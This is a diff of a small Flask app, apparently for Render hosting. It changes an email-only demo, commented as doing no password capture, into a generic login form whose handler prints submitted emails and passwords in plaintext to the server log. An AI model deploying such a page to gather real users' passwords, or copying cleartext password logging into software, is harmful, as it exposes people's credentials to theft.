@@ -1,22 +1,32 @@
 from flask import Flask, request
-import os
 
 app = Flask(__name__)
 
-# Home route (prevents 404)
+# Home page with a form
 @app.route('/')
 def home():
-    return "App is running!"
+    return '''
+    <h2>Login Page (Demo)</h2>
+    <form action="/login" method="post">
+        Email: <input type="text" name="email"><br><br>
+        Password: <input type="password" name="password"><br><br>
+        <input type="submit" value="Login">
+    </form>
+    '''
 
-# Example POST route (safe demo)
+# Login handler
 @app.route('/login', methods=['POST'])
 def login():
     email = request.form.get('email')
+    password = request.form.get('password')
 
-    # Just demonstrate receiving data (no password capture)
-    return f"Received email: {email} (demo only)"
+    print(f"Email: {email}")
+    print(f"Password: {password}")
 
-# IMPORTANT: Render deployment fix
+    return "Login received (demo)"
+
+# Render fix
 if __name__ == '__main__':
+    import os
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
